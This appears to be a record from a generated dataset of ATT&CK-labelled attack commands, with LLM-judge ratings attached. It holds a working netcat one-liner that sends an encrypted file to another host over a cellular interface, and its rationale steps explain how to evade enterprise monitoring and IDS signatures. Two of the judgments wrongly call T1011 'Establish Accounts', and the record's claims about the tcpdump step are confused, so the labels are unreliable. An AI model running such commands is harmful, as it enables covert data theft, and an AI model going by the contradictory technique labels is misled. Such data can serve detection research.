command: nohup tcpdump -i wwan0 -nn tcp port 55941 -U -w /dev/null >/dev/null 2>&1 & nc -s 10.64.23.5 10.64.23.9 55941 < /var/tmp/report.enc
explanation: Uses a cellular data interface (wwan0) to send data over an uncommon TCP port with minimal monitoring via tcpdump. This shifts exfiltration to a cellular medium, consistent with T1011.
rationale_steps: Choose the cellular interface to avoid enterprise wired/wireless paths.
Use rare TCP port 55941 to avoid default IDS signatures.
Limit tcpdump to the exact interface/port and drop captured bytes.
Bind nc to the wwan0 source IP to force the cellular route.

llm_judgments.syntactic_justification: The command is perfectly well-formed with proper syntax, balanced quoting, valid flags for both tcpdump and netcat, and correct command chaining with background process handling.
llm_judgments.semantic_justification: The command aligns well with T1011 exfiltration over alternative protocol by using cellular interface (wwan0) to transmit encrypted data over an uncommon port, though the tcpdump portion is somewhat superfluous as it writes to /dev/null.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using valid Bash syntax for backgrounding, redirection, and standard command flags for nohup, tcpdump, and netcat.
llm_judgments.semantic_justification: The command performs exfiltration via netcat, which is entirely unrelated to the specified MITRE ATT&CK T1011 'Establish Accounts' technique, thus failing to achieve the claimed intent regarding the technique.

llm_judgments.syntactic_justification: Well-formed Bash: valid flags and filters for tcpdump and nc, correct redirections, and proper backgrounding with '&' before executing the next command.
llm_judgments.semantic_justification: Per the provided technique description (Establish Accounts), this command conducts data transfer/exfiltration via netcat and tcpdump rather than creating or abusing accounts, so it is not aligned.
